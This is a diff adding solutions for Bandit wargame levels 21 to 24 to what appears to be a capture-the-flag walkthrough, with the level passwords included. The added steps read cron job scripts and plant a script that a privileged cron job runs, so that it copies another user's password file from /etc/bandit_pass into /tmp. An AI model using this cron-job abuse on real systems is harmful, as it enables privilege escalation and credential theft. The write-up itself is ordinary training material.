@@ -318,15 +318,106 @@ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 7777 localhost &
 ## Level 21→ Level 22
 
 ```
-
+cd /etc/cron.d
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
 ```
+```
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+```
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+`Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI`
 
 
 
 ## Level 22→ Level 23
 
+```
+cd /etc/cron.d
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit23.sh
+```
+
+```
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+```
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+```
+
+8ca319486bfbbc3663ea0fbe81326349
+
+```
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+`jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
+
+
 
 ## Level 23→ Level 24
+
+```
+cd /etc/cron.d
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+```
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+Write shell script
+```
+mkdir /tmp/shell
+cd /tmp/shell
+vi shell.sh
+```
+```
+#! /bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/shell/test.txt
+exit 0     
+```
+```
+chmod 777 /tmp/shell/shell.sh
+chmod o+w /tmp/shell
+```
+```
+cd /var/spool/bandit24
+cp /tmp/shell/shell.sh .
+```
+Wait for 1 minute
+
+```
+cat /tmp/shell/test.txt
+```
+`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
 
 
 ## Level 24→ Level 25
